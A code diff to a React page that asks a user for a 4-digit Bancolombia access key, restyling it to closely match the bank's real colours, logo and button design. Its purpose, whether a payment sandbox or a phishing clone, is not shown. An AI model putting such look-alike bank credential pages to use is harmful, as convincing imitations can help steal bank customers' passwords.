@@ -78,27 +78,43 @@ export default function BancolombiaClavePage() {
   const digits = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'];
 
   return (
-    <div className="min-h-screen bg-[#004B87] flex items-center justify-center p-4">
-      <div className="max-w-md w-full">
+    <div className="min-h-screen bg-white flex items-center justify-center p-4 relative overflow-hidden">
+      {/* Decorative arcs */}
+      <div className="absolute top-0 left-0 w-full h-full pointer-events-none overflow-hidden">
+        <svg className="absolute -top-32 -left-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
+          <path d="M-20 380 Q 150 200 320 380" stroke="#FF6B35" strokeWidth="40" fill="none" opacity="0.4"/>
+          <path d="M-10 390 Q 160 210 330 390" stroke="#FFA500" strokeWidth="40" fill="none" opacity="0.4"/>
+          <path d="M0 400 Q 170 220 340 400" stroke="#FFD700" strokeWidth="40" fill="none" opacity="0.4"/>
+        </svg>
+        <svg className="absolute -bottom-32 -right-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
+          <path d="M420 20 Q 250 200 80 20" stroke="#9333EA" strokeWidth="40" fill="none" opacity="0.4"/>
+          <path d="M410 10 Q 240 190 70 10" stroke="#F59E0B" strokeWidth="40" fill="none" opacity="0.4"/>
+          <path d="M400 0 Q 230 180 60 0" stroke="#EF4444" strokeWidth="40" fill="none" opacity="0.4"/>
+        </svg>
+      </div>
+
+      <div className="max-w-md w-full relative z-10">
         {/* Header */}
         <div className="text-center mb-8">
-          <div className="bg-white rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
-            <img 
-              src="/logos/bancos/bancolombia.png" 
-              alt="Bancolombia" 
-              className="w-14 h-14 object-contain"
-            />
-          </div>
-          <h1 className="text-white text-2xl font-bold mb-2">Bancolombia</h1>
-          <p className="text-blue-200">Autenticación Segura</p>
+          <img 
+            src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
+            alt="Bancolombia" 
+            className="h-6 mx-auto mb-6 object-contain"
+          />
+          <button
+            onClick={handleCancel}
+            className="absolute top-0 right-0 text-gray-600 hover:text-gray-800"
+          >
+            Salir →
+          </button>
         </div>
 
         {/* Form */}
-        <div className="bg-white rounded-xl shadow-2xl p-8">
+        <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
           <div className="text-center mb-6">
-            <h2 className="text-2xl font-bold text-gray-800 mb-2">Clave de Acceso</h2>
+            <h2 className="text-2xl font-bold text-gray-900 mb-2">Clave de Acceso</h2>
             <p className="text-gray-600">
-              Bienvenido <span className="font-medium text-[#004B87]">{usuario}</span>
+              Bienvenido <span className="font-medium text-gray-900">{usuario}</span>
             </p>
             <p className="text-sm text-gray-500 mt-2">Ingresa tu clave de 4 dígitos</p>
           </div>
@@ -156,7 +172,7 @@ export default function BancolombiaClavePage() {
             <button
               type="button"
               onClick={handleCancel}
-              className="flex-1 py-3 px-6 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition disabled:opacity-50 font-medium"
+              className="flex-1 py-3.5 px-6 bg-white border-2 border-gray-300 text-gray-700 rounded-full hover:bg-gray-50 transition disabled:opacity-50 font-medium"
               disabled={loading}
             >
               Cancelar
@@ -164,11 +180,11 @@ export default function BancolombiaClavePage() {
             <button
               onClick={handleSubmit}
               disabled={clave.length !== 4 || loading}
-              className="flex-1 py-3 px-6 bg-[#004B87] text-white rounded-lg hover:bg-[#003666] disabled:opacity-50 disabled:cursor-not-allowed transition font-medium"
+              className="flex-1 py-3.5 px-6 bg-[#FDDA24] text-gray-900 rounded-full hover:bg-[#FED500] disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
             >
               {loading ? (
                 <span className="flex items-center justify-center">
-                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
@@ -190,14 +206,13 @@ export default function BancolombiaClavePage() {
           </div>
         </div>
 
-        {/* Footer Info */}
-        <div className="text-center mt-6">
-          <p className="text-blue-200 text-sm">
-            Esta transacción es procesada de forma segura por Bancolombia
-          </p>
-          <p className="text-blue-300 text-xs mt-2">
-            Session ID: {sessionId.slice(-8)}
-          </p>
+        {/* Footer Logo */}
+        <div className="text-center mt-8">
+          <img 
+            src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
+            alt="Bancolombia" 
+            className="h-5 mx-auto opacity-60"
+          />
         </div>
       </div>
     </div>
